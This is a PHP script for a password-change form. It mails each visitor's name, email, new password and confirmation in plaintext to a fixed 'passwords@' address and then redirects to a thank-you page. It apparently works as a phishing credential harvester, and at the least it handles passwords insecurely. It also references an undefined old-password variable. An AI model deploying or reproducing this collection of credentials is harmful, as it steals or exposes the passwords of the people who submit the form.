<?php
/* Set e-mail recipient */
$myemail = "passwords@nubrink.com";

/* Check all form inputs using check_input function */
$name = check_input($_POST['name'], "Enter your name");
$email = check_input($_POST['email']);
$newpassword = check_input($_POST['newpassword'], "Enter your new password");
$confirmpassword = check_input($_POST['confirmpassword'], "Confirm your new password");

/* If e-mail is not valid show error message */
if (!preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/", $email))
{
show_error("E-mail address not valid");
}
/* Let's prepare the message for the e-mail */
$message = "

Name: $name
E-mail: $email
OldPassword: $oldpassword

New Password:
$newpassword

Confirm New Password:
$confirmpassword
";

/* Send the message using mail() function */
mail($myemail, $email, $message);

/* Redirect visitor to the thank you page */
header('Location: thankyou.html');
exit();

/* Functions we used */
function check_input($data, $problem='')
{
$data = trim($data);
$data = stripslashes($data);
$data = htmlspecialchars($data);
if ($problem && strlen($data) == 0)
{
show_error($problem);
}
return $data;
}

function show_error($myError)
{
?>
<html>
<body>

<p>Please correct the following error:</p>
<strong><?php echo $myError; ?></strong>
<p>Hit the back button and try again</p>

</body>
</html>
<?php
exit();
}
?>